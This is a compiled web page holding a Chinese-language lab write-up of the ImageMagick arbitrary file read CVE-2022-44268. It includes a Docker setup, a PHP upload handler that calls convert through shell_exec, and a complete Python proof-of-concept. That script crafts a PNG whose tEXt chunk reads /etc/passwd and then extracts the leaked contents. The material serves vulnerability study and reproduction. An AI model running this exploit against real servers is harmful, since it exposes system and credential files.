import{_ as d}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as r,c as t,a as e,b as i,d as a,e as s}from"./app-58e4a7d6.js";const c={},u=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),o=e("p",null,"ImageMagick是一款使用量很广的图片处理程序，很多厂商都调用了这个程序进行图片处理，包括图片的伸缩、切割、水印、格式转换等等。",-1),v=e("p",null,"在ImageMagick 7.1.0-51版本及以前，其处理PNG文件的代码中存在一处功能，会导致转换图片时读取到当前操作系统上的任意文件，并将文件内容输出在图片内容中。",-1),m=e("p",null,"参考链接：",-1),p={href:"https://www.metabaseq.com/imagemagick-zero-days/",target:"_blank",rel:"noopener noreferrer"},b={href:"https://github.com/ImageMagick/Website/blob/main/ChangeLog.md#710-52---2022-11-06",target:"_blank",rel:"noopener noreferrer"},g=s(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Web服务器，这个服务器的功能是将用户上传的任意图片缩小成50x50的PNG图片。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问<code>http://your-ip:8080</code>可以看到图片上传框：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230206091512388.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><a href="#%E5%90%8E%E7%AB%AF%E6%9C%8D%E5%8A%A1%E4%BB%A3%E7%A0%81">后端服务</a>的代码十分简单：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$newname = uniqid() . &#39;.png&#39;;
shell_exec(&quot;convert -resize 50x50 {$_FILES[&#39;file_upload&#39;][&#39;tmp_name&#39;]} ./{$newname}&quot;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用这个漏洞，需要先准备一个恶意PNG文件，文件内容中包含我们准备读取的文件路径：</p><p>可以使用<a href="#poc.py">poc.py</a>来生成这个图片：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py generate -i input.png -o poc.png -r /etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,11),f={href:"https://pypng.readthedocs.io/en/latest/",target:"_blank",rel:"noopener noreferrer"},h=e("code",null,"pip install pypng",-1),x={href:"https://en.wikipedia.org/wiki/010_Editor",target:"_blank",rel:"noopener noreferrer"},_=e("code",null,"tEXt",-1),k=e("code",null,"profile=/etc/passwd",-1),y=s(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230206092153724-16788460993989.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>接着，我们将这个图片上传到目标服务中：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230206092252429-167884610230611.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>下载服务处理后生成的图片，使用<a href="#poc.py">poc.py</a>提取出其中所有内容：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py parse -i output.png
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230206092642268-167884610412013.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以看到，已经提取出<code>/etc/passwd</code>文件的内容，这部分内容是由ImageMagick在处理旧图片时读取并写入到新图片中。</p><h2 id="附录" tabindex="-1"><a class="header-anchor" href="#附录" aria-hidden="true">#</a> 附录</h2><h3 id="后端服务代码" tabindex="-1"><a class="header-anchor" href="#后端服务代码" aria-hidden="true">#</a> 后端服务代码</h3><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
$newname = &#39;&#39;;
if (!empty($_FILES)) {
    $ext = pathinfo($_FILES[&#39;file_upload&#39;][&#39;name&#39;], PATHINFO_EXTENSION);
    if (!in_array($ext, [&#39;gif&#39;, &#39;png&#39;, &#39;jpg&#39;, &#39;jpeg&#39;])) {
        die(&#39;Unsupported filetype uploaded.&#39;);
    }

    $newname = uniqid() . &#39;.png&#39;;
    shell_exec(&quot;convert -resize 50x50 {$_FILES[&#39;file_upload&#39;][&#39;tmp_name&#39;]} ./{$newname}&quot;);
}
?&gt;
&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    File: &lt;input type=&quot;file&quot; name=&quot;file_upload&quot;&gt;
    &lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
&lt;br&gt;
&lt;?php
if ($newname):
?&gt;
&lt;h1&gt;Your image:&lt;/h1&gt;
&lt;p&gt;
    &lt;a href=&quot;./&lt;?=$newname?&gt;&quot; target=&quot;_blank&quot;&gt;
        &lt;img src=&quot;./&lt;?=$newname?&gt;&quot; width=&quot;50&quot; height=&quot;50&quot;&gt;
    &lt;/a&gt;
&lt;/p&gt;
&lt;?php
endif;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,10),w={id:"poc-py",tabindex:"-1"},q=e("a",{class:"header-anchor",href:"#poc-py","aria-hidden":"true"},"#",-1),E={href:"http://poc.py",target:"_blank",rel:"noopener noreferrer"},I=s(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#!/usr/bin/env python3
import sys
import png
import zlib
import argparse
import binascii
import logging

logging.basicConfig(stream=sys.stderr, level=logging.INFO, format=&#39;%(asctime)s - %(levelname)s - %(message)s&#39;)
d = zlib.decompressobj()
e = zlib.compressobj()
IHDR = b&#39;\\x00\\x00\\x00\\n\\x00\\x00\\x00\\n\\x08\\x02\\x00\\x00\\x00&#39;
IDAT = b&#39;x\\x9c\\xbd\\xcc\\xa1\\x11\\xc0 \\x0cF\\xe1\\xb4\\x03D\\x91\\x8b\`\\xffm\\x98\\x010\\x89\\x01\\xc5\\x00\\xfc\\xb8\\n\\x8eV\\xf6\\xd9&#39; \\
       b&#39;\\xef\\xee])%z\\xef\\xfe\\xb0\\x9f\\xb8\\xf7^J!\\xa2Zkkm\\xe7\\x10\\x02\\x80\\x9c\\xf3\\x9cSD\\x0esU\\x1dc\\xa8\\xeaa\\x0e\\xc0&#39; \\
       b&#39;\\xccb\\x8cf\\x06\`gwgf\\x11afw\\x7fx\\x01^K+F&#39;


def parse_data(data: bytes) -&gt; str:
    _, data = data.strip().split(b&#39;\\n&#39;, 1)
    return binascii.unhexlify(data.replace(b&#39;\\n&#39;, b&#39;&#39;)).decode()


def read(filename: str):
    if not filename:
        logging.error(&#39;you must specify a input filename&#39;)
        return

    res = &#39;&#39;
    p = png.Reader(filename=filename)
    for k, v in p.chunks():
        logging.info(&quot;chunk %s found, value = %r&quot;, k.decode(), v)
        if k == b&#39;zTXt&#39;:
            name, data = v.split(b&#39;\\x00&#39;, 1)
            res = parse_data(d.decompress(data[1:]))

    if res:
        sys.stdout.write(res)
        sys.stdout.flush()


def write(from_filename, to_filename, read_filename):
    if not to_filename:
        logging.error(&#39;you must specify a output filename&#39;)
        return

    with open(to_filename, &#39;wb&#39;) as f:
        f.write(png.signature)
        if from_filename:
            p = png.Reader(filename=from_filename)
            for k, v in p.chunks():
                if k != b&#39;IEND&#39;:
                    png.write_chunk(f, k, v)
        else:
            png.write_chunk(f, b&#39;IHDR&#39;, IHDR)
            png.write_chunk(f, b&#39;IDAT&#39;, IDAT)

        png.write_chunk(f, b&quot;tEXt&quot;, b&quot;profile\\x00&quot; + read_filename.encode())
        png.write_chunk(f, b&#39;IEND&#39;, b&#39;&#39;)


def main():
    parser = argparse.ArgumentParser(description=&#39;POC for CVE-2022-44268&#39;)
    parser.add_argument(&#39;action&#39;, type=str, choices=(&#39;generate&#39;, &#39;parse&#39;))
    parser.add_argument(&#39;-i&#39;, &#39;--input&#39;, type=str, help=&#39;input filename&#39;)
    parser.add_argument(&#39;-o&#39;, &#39;--output&#39;, type=str, help=&#39;output filename&#39;)
    parser.add_argument(&#39;-r&#39;, &#39;--read&#39;, type=str, help=&#39;target file to read&#39;, default=&#39;/etc/passwd&#39;)
    args = parser.parse_args()
    if args.action == &#39;generate&#39;:
        write(args.input, args.output, args.read)
    elif args.action == &#39;parse&#39;:
        read(args.input)
    else:
        logging.error(&quot;bad action&quot;)


if __name__ == &#39;__main__&#39;:
    main()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function N($,z){const n=l("ExternalLinkIcon");return r(),t("div",null,[u,o,v,m,e("ul",null,[e("li",null,[e("a",p,[i("https://www.metabaseq.com/imagemagick-zero-days/"),a(n)])]),e("li",null,[e("a",b,[i("https://github.com/ImageMagick/Website/blob/main/ChangeLog.md#710-52---2022-11-06"),a(n)])])]),g,e("blockquote",null,[e("p",null,[i("执行poc.py前请安装"),e("a",f,[i("PyPNG"),a(n)]),i("："),h])]),e("p",null,[i("如果你使用"),e("a",x,[i("010editor"),a(n)]),i("查看这个图片，可以看到其中包含一个类型是"),_,i("的chunk，其中包含我们的Payload "),k,i("：")]),y,e("h3",w,[q,i(),e("a",E,[i("poc.py"),a(n)])]),I])}const F=d(c,[["render",N],["__file","ImageMagick任意文件读取漏洞 CVE-2022-44268.html.vue"]]);export{F as default};
